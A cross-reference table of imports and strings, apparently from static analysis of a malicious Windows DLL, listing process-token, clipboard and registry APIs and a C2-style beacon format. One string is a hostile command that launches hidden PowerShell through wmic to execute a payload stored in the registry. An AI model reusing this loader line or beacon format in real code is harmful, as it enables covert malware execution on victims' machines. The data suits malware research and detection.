reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x100025f8	0x1000ca68	string	0x100025d0	SOFTWARE\Microsoft\Internet Explorer\Main
0x10002630	0x1000a0f0	import	0x10002616	oleaut32.dll.SysReAllocString
0x10002640	0x1000c364	string	0x10002616	sValue
0x1000264e	0x1000c228	string	0x10002616	SetStringValue
0x10002667	0x1000a0e4	import	0x10002616	oleaut32.dll.SysStringLen
0x100026a2	0x1000a0ec	import	0x1000267a	oleaut32.dll.SafeArrayDestroy
0x100026ad	0x100026f0	string	0x1000267a	j\b^_
0x100026e8	0x1000a0e8	import	0x1000267a	oleaut32.dll.SafeArrayGetDim
0x1000270b	0x10002758	string	0x100026fb	j\bX_^]
0x10002727	0x1000c1cc	string	0x100026fb	StdRegProv
0x100027fb	0x10002816	string	0x100027bc	_^[]
0x10002848	0x10002861	string	0x1000281d	JuӋE\b blocks=Basic Latin,Cyrillic
0x100029de	0x10003803	string	0x10002979	IVWx
0x100032b0	0x100032e5	string	0x100032a0	_^[]
0x100032d9	0x100032e5	string	0x100032a0	_^[]
0x100035da	0x10003803	string	0x100034db	IVWx
0x10003961	0x1000a03c	import	0x10003959	kernel32.dll.CreateEventA
0x10003970	0x1000a0b8	import	0x10003959	kernel32.dll.GetVersion
0x1000397f	0x1000a048	import	0x10003959	kernel32.dll.GetCurrentProcessId
0x1000399c	0x1000a000	import	0x10003959	kernel32.dll.OpenProcess
0x100039bb	0x1000a038	import	0x10003959	kernel32.dll.GetLastError
0x100039f6	0x1000b0b0	import	0x100039c4	ADVAPI32.dll.OpenProcessToken
0x10003a01	0x1000b0b4	import	0x100039c4	ADVAPI32.dll.GetTokenInformation
0x10003a51	0x1000b0bc	import	0x100039c4	ADVAPI32.dll.GetSidSubAuthorityCount
0x10003a61	0x1000b0ac	import	0x100039c4	ADVAPI32.dll.GetSidSubAuthority
0x10003a76	0x1000a044	import	0x100039c4	kernel32.dll.CloseHandle
0x10003aa9	0x1000a294	string	0x10003a8d	.bss
0x10003ab2	0x1000a0b4	import	0x10003a8d	kernel32.dll.lstrcpyn
0x10003b09	0x1000a288	string	0x10003a8d	Oct 22 2018
0x10003b2a	0x1000a0d8	import	0x10003a8d	kernel32.dll.VirtualAlloc
0x10003b52	0x1000c2c2	string	0x10003a8d	version=%u&soft=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s
0x10003b8c	0x1000a0cc	import	0x10003a8d	kernel32.dll.VirtualFree
0x10003c10	0x1000c434	string	0x10003c0a	{%08X-%04X-%04X-%04X-%08X%04X}
0x10003c17	0x1000c082	string	0x10003c0a	%08X-%04X-%04X-%04X-%08X%04X
0x10003c5c	0x1000b0f8	import	0x10003c0a	USER32.dll.wsprintfA
0x10003c9f	0x1000a058	import	0x10003c69	kernel32.dll.lstrlen
0x10003cc3	0x1000a054	import	0x10003c69	kernel32.dll.lstrcpy
0x10003ccb	0x1000a0bc	import	0x10003c69	kernel32.dll.lstrcat
0x10003d06	0x1000b0c0	import	0x10003ce0	ADVAPI32.dll.RegOpenKeyExA
0x10003d4d	0x1000b0a8	import	0x10003ce0	ADVAPI32.dll.RegEnumKeyExA
0x10003dba	0x1000a040	import	0x10003ce0	kernel32.dll.WaitForSingleObject
0x10003de2	0x1000b0c4	import	0x10003ce0	ADVAPI32.dll.RegCloseKey
0x10003e08	0x1000a00c	import	0x10003df1	kernel32.dll.HeapAlloc
0x10003e8a	0x1000a0d0	import	0x10003df1	kernel32.dll.CreateFileA
0x10003e9e	0x1000a09c	import	0x10003df1	kernel32.dll.GetFileTime
0x10003eb5	0x1000a044	import	0x10003df1	kernel32.dll.CloseHandle
0x10003ec1	0x1000b0e0	import	0x10003df1	SHLWAPI.dll.StrRChrA
0x10003eea	0x1000c6a5	string	0x10003df1	\*.dll
0x10003efb	0x1000a0bc	import	0x10003df1	kernel32.dll.lstrcat
0x10003f01	0x1000a0ac	import	0x10003df1	kernel32.dll.FindFirstFileA
0x10003f1e	0x1000a0a4	import	0x10003df1	kernel32.dll.CompareFileTime
0x10003f31	0x1000a0a8	import	0x10003df1	kernel32.dll.FindClose
0x10003f43	0x1000a0a0	import	0x10003df1	kernel32.dll.FindNextFileA
0x10003fb1	0x1000b0f0	import	0x10003df1	SHLWAPI.dll.StrChrA
0x10003fff	0x1000a0a0	import	0x10003df1	kernel32.dll.FindNextFileA
0x10004028	0x1000a0a4	import	0x10003df1	kernel32.dll.CompareFileTime
0x1000406f	0x1000a018	import	0x10003df1	kernel32.dll.HeapFree
0x1000407f	0x1000a018	import	0x10003df1	kernel32.dll.HeapFree
0x10004096	0x1000a0c8	import	0x1000408f	kernel32.dll.Wow64EnableWow64FsRedirection
0x100040e5	0x1000a018	import	0x1000408f	kernel32.dll.HeapFree
0x10004245	0x1000a094	import	0x10004244	kernel32.dll.ExpandEnvironmentStringsW
0x10004252	0x1000c908	string	0x10004244	%systemroot%\system32\wbem\wmic.exe /output:clipboard process call create "powershell -w hidden iex([System.Text.Encoding]::ASCII.GetString((get-itemproperty 'HKCU:\%S').%s))"
0x10004288	0x1000a098	import	0x10004287	kernel32.dll.ExpandEnvironmentStringsA
0x10004295	0x1000c684	string	0x10004287	%systemroot%\system32\c_1252.nls
0x100042c9	0x1000a058	import	0x100042c7	kernel32.dll.lstrlen
0x100042d0	0x1000c2a2	string	0x100042c7	/SetBinaryValue
0x100042f2	0x1000a054	import	0x100042c7	kernel32.dll.lstrcpy
0x100042fd	0x1000a0bc	import	0x100042c7	kernel32.dll.lstrcat
0x10004314	0x1000a058	import	0x1000430b	kernel32.dll.lstrlen
0x1000435f	0x1000a058	import	0x10004356	kernel32.dll.lstrlen
0x10004459	0x1000a090	import	0x100043a8	kernel32.dll.lstrcmp
0x10004464	0x1000a058	import	0x100043a8	kernel32.dll.lstrlen
0x1000451c	0x1000b0f0	import	0x1000451a	SHLWAPI.dll.StrChrA
0x10004538	0x1000452f	string	0x1000451a	Fj @P
0x10004553	0x1000b0d4	import	0x1000451a	SHLWAPI.dll.StrTrimA
0x10004570	0x1000b0d4	import	0x1000451a	SHLWAPI.dll.StrTrimA
0x100045e3	0x1000a100	import	0x1000459c	ntdll.dll.NtOpenProcess
0x100045f6	0x1000a0fc	import	0x1000459c	ntdll.dll.NtOpenProcessToken
0x10004600	0x1000a10c	import	0x1000459c	ntdll.dll.NtQueryInformationToken
0x1000464e	0x1000a104	import	0x1000459c	ntdll.dll.NtClose
0x10004658	0x1000a104	import	0x1000459c	ntdll.dll.NtClose
0x1000466f	0x1000a084	import	0x10004666	kernel32.dll.EnterCriticalSection
0x10004679	0x1000a074	import	0x10004666	kernel32.dll.Sleep
0x100046a1	0x1000a018	import	0x10004666	kernel32.dll.HeapFree
0x100046bd	0x1000a088	import	0x10004666	kernel32.dll.LeaveCriticalSection
0x100046cf	0x1000a084	import	0x100046c6	kernel32.dll.EnterCriticalSection
0x100046d9	0x1000a074	import	0x100046c6	kernel32.dll.Sleep
0x1000470c	0x1000a088	import	0x100046c6	kernel32.dll.LeaveCriticalSection
0x10004734	0x1000a084	import	0x10004718	kernel32.dll.EnterCriticalSection
0x10004752	0x1000a088	import	0x10004718	kernel32.dll.LeaveCriticalSection
0x1000478d	0x1000a084	import	0x10004784	kernel32.dll.EnterCriticalSection
0x10004797	0x1000a074	import	0x10004784	kernel32.dll.Sleep
0x100047b4	0x1000c767	string	0x10004784	0123456789ABCDEF
0x100047c5	0x1000a018	import	0x10004784	kernel32.dll.HeapFree
0x100047da	0x1000a088	import	0x10004784	kernel32.dll.LeaveCriticalSection
0x100047ed	0x1000a058	import	0x100047e3	kernel32.dll.lstrlen
0x1000483c	0x1000c510	string	0x100047e3	%c%02X
0x100048b8	0x1000a058	import	0x100048ad	kernel32.dll.lstrlen
0x100048d0	0x1000a00c	import	0x100048ad	kernel32.dll.HeapAlloc
0x100049a8	0x1000c517	string	0x10004945	%s=%s&
0x100049ae	0x1000a058	import	0x10004945	kernel32.dll.lstrlen
0x10004a0b	0x1000a058	import	0x100049f3	kernel32.dll.lstrlen
0x10004a3c	0x1000a0bc	import	0x100049f3	kernel32.dll.lstrcat
0x10004a59	0x1000b0d4	import	0x100049f3	SHLWAPI.dll.StrTrimA
0x10004b3d	0x1000a078	import	0x10004b24	kernel32.dll.GetVersionExA
0x10004b9b	0x1000c7a8	string	0x10004b24	%u.%u_%u_%u_x%u
0x10004ba1	0x1000b0f8	import	0x10004b24	USER32.dll.wsprintfA
0x10004bc9	0x1000a028	import	0x10004bb2	kernel32.dll.GetTickCount
0x10004be9	0x1000b0f8	import	0x10004bb2	USER32.dll.wsprintfA
0x10004c09	0x1000c51e	string	0x10004bb2	soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x
0x10004c1a	0x1000a0c4	import	0x10004bb2	kernel32.dll.QueryPerformanceFrequency
0x10004c24	0x1000a0c0	import	0x10004bb2	kernel32.dll.QueryPerformanceCounter
0x10004c3f	0x1000c55e	string	0x10004bb2	&uptime=%u
0x10004c50	0x1000a060	import	0x10004bb2	kernel32.dll.GetSystemTimeAsFileTime
0x10004c7d	0x1000c35a	string	0x10004bb2	&time=%lu
0x10004c8a	0x1000c64f	string	0x10004bb2	.avi
0x10004c8f	0x1000c635	string	0x10004bb2	.jpeg
0x10004c9d	0x1000c30b	string	0x10004bb2	&action=%08x
0x10004cb4	0x1000c7a1	string	0x10004bb2	&os=%s
0x10004ced	0x1000a00c	import	0x10004bb2	kernel32.dll.HeapAlloc
0x10004cfe	0x1000a028	import	0x10004bb2	kernel32.dll.GetTickCount
0x10004d12	0x1000a084	import	0x10004bb2	kernel32.dll.EnterCriticalSection
0x10004d30	0x1000a088	import	0x10004bb2	kernel32.dll.LeaveCriticalSection
0x10004d65	0x1000b0d4	import	0x10004bb2	SHLWAPI.dll.StrTrimA
0x10004d85	0x1000a054	import	0x10004bb2	kernel32.dll.lstrcpy
0x10004d8e	0x1000a0bc	import	0x10004bb2	kernel32.dll.lstrcat
0x10004e86	0x1000a018	import	0x10004bb2	kernel32.dll.HeapFree
0x10004e97	0x1000a018	import	0x10004bb2	kernel32.dll.HeapFree
0x10004ea7	0x1000a018	import	0x10004bb2	kernel32.dll.HeapFree
0x10004eb7	0x1000a018	import	0x10004bb2	kernel32.dll.HeapFree
0x10004ec5	0x1000a018	import	0x10004bb2	kernel32.dll.HeapFree
0x10004ef4	0x1000b0b8	import	0x10004ed5	ADVAPI32.dll.GetUserNameW
0x10004f12	0x1000a00c	import	0x10004ed5	kernel32.dll.HeapAlloc
0x10004f43	0x1000a018	import	0x10004ed5	kernel32.dll.HeapFree
0x10004f51	0x1000a070	import	0x10004ed5	kernel32.dll.GetComputerNameW
0x10004f68	0x1000a00c	import	0x10004ed5	kernel32.dll.HeapAlloc
0x10004f79	0x1000a070	import	0x10004ed5	kernel32.dll.GetComputerNameW
0x10004f9a	0x1000a018	import	0x10004ed5	kernel32.dll.HeapFree
0x10004ff1	0x1000a074	import	0x10004fc3	kernel32.dll.Sleep
0x10005027	0x1000a02c	import	0x10004fc3	kernel32.dll.lstrlenW
0x1000505c	0x1000a0e4	import	0x10004fc3	oleaut32.dll.SysStringLen
0x100050ca	0x1000a0f0	import	0x10005082	oleaut32.dll.SysReAllocString
0x100050ee	0x1000a0e4	import	0x10005082	oleaut32.dll.SysStringLen
0x10005191	0x1000c068	string	0x10005082	overridelink
0x10005199	0x1000a06c	import	0x10005082	kernel32.dll.lstrcmpW
0x10005213	0x1000a074	import	0x100051fa	kernel32.dll.Sleep
0x10005298	0x1000a0f0	import	0x10005257	oleaut32.dll.SysReAllocString
0x1000530c	0x1000c018	string	0x10005257	%D,3
0x1000533b	0x10005372	string	0x10005257	9]\ft5
0x10005340	0x10005372	string	0x10005257	9]\ft5
0x10005342	0x1000c000	string	0x10005257	invalidcert
0x1000534a	0x1000b0dc	import	0x10005257	SHLWAPI.dll.StrStrIW
0x1000536c	0x1000a0e4	import	0x10005257	oleaut32.dll.SysStringLen
0x100053c0	0x1000a0e8	import	0x10005257	oleaut32.dll.SafeArrayGetDim
0x100053ce	0x1000a0e4	import	0x10005257	oleaut32.dll.SysStringLen
0x10005403	0x1000b110	import	0x100053de	ole32.dll.CoCreateInstance
0x100055a5	0x100055d8	string	0x1000557e	9]\btiV
0x100055d1	0x100055d8	string	0x1000557e	9]\btiV
0x10005674	0x1000a058	import	0x1000565d	kernel32.dll.lstrlen
0x10008a28	0x1000a118	import	0x10008a28	ntdll.dll.memcpy
0x10008a2e	0x1000a11c	import	0x10008a2e	ntdll.dll.memset
0x10008a34	0x1000b0d8	import	0x10008a2e	SHLWAPI.dll.StrChrW
0x10008a39	0x10008a3e	string	0x10008a2e	QRPh
0x10008a4f	0x1000b0f0	import	0x10008a2e	SHLWAPI.dll.StrChrA
0x10008a54	0x10008a3e	string	0x10008a2e	QRPh
0x10008a59	0x1000b0ec	import	0x10008a2e	SHLWAPI.dll.StrToIntExA
0x10008a5e	0x10008a3e	string	0x10008a2e	QRPh
0x10008a63	0x1000b0e8	import	0x10008a2e	SHLWAPI.dll.StrStrA
0x10008a68	0x10008a3e	string	0x10008a2e	QRPh
0x10008a6d	0x1000b0e4	import	0x10008a2e	SHLWAPI.dll.IUnknown_QueryService
0x10008a72	0x10008a3e	string	0x10008a2e	QRPh
0x10008a77	0x1000b0fc	import	0x10008a2e	USER32.dll.GetClipboardData
0x10008a7c	0x10008a81	string	0x10008a2e	QRPhܢ blocks=Basic Latin,Syriac
0x10008a92	0x1000b100	import	0x10008a2e	USER32.dll.OpenClipboard
0x10008a97	0x10008a81	string	0x10008a2e	QRPhܢ blocks=Basic Latin,Syriac
0x10008a9c	0x1000b104	import	0x10008a2e	USER32.dll.wsprintfW
0x10008aa1	0x10008a81	string	0x10008a2e	QRPhܢ blocks=Basic Latin,Syriac
0x10008aa6	0x1000b108	import	0x10008a2e	USER32.dll.CloseClipboard
0x10008aab	0x10008a81	string	0x10008a2e	QRPhܢ blocks=Basic Latin,Syriac
0x10008ab0	0x1000b0cc	import	0x10008a2e	SHELL32.dll.ShellExecuteExW
0x10008ab5	0x10008aba	string	0x10008a2e	QRPh
0x10008acb	0x1000b110	import	0x10008a2e	ole32.dll.CoCreateInstance
0x10008ad0	0x10008ad5	string	0x10008a2e	QRPh
0x10008ae6	0x1000b11c	import	0x10008a2e	ole32.dll.CoSetProxyBlanket
0x10008aeb	0x10008ad5	string	0x10008a2e	QRPh
0x10008c1e	0x1000a114	import	0x10008c1e	ntdll.dll.mbstowcs
0x10008c24	0x1000a108	import	0x10008c24	ntdll.dll.strcpy
0x10008c2a	0x1000a0f8	import	0x10008c2a	ntdll.dll.wcstombs
0x10008c30	0x1000a110	import	0x10008c30	ntdll.dll._snprintf
0x10008c36	0x1000a120	import	0x10008c36	ntdll.dll.sprintf
0x10008cb5	0x1000a0b0	import	0x10008c3c	kernel32.dll.RaiseException
0x10008d32	0x1000a080	import	0x10008c3c	kernel32.dll.LoadLibraryA
0x10008d3e	0x1000a038	import	0x10008c3c	kernel32.dll.GetLastError
0x10008d71	0x1000a0b0	import	0x10008c3c	kernel32.dll.RaiseException
0x10008d83	0x1000a004	import	0x10008c3c	kernel32.dll.InterlockedExchange
0x10008d97	0x1000a008	import	0x10008c3c	kernel32.dll.LocalAlloc
0x10008db4	0x1000a07c	import	0x10008c3c	kernel32.dll.FreeLibrary
0x10008e09	0x1000a0d4	import	0x10008c3c	kernel32.dll.GetProcAddress
0x10008e15	0x1000a038	import	0x10008c3c	kernel32.dll.GetLastError
0x10008e47	0x1000a0b0	import	0x10008c3c	kernel32.dll.RaiseException
0x100091d2	0x1000a124	import	0x100091d2	ntdll.dll._aulldiv
0x100091d8	0x1000a128	import	0x100091d8	ntdll.dll._allmul
0x100092ed	0x10009312	string	0x10009234	]_^[
0x100092fb	0x10009312	string	0x10009234	]_^[
0x10009343	0x10009350	string	0x10009338	]_^[
0x1000948c	0x10009496	string	0x1000944d	3҉U\b blocks=Basic Latin,Cyrillic
0x10009627	0x1000961d	string	0x1000944d	90t\bJ
0x10009670	0x1000a12c	import	0x10009670	ntdll.dll.RtlUnwind
0x10009676	0x1000a130	import	0x10009676	ntdll.dll.NtQueryVirtualMemory
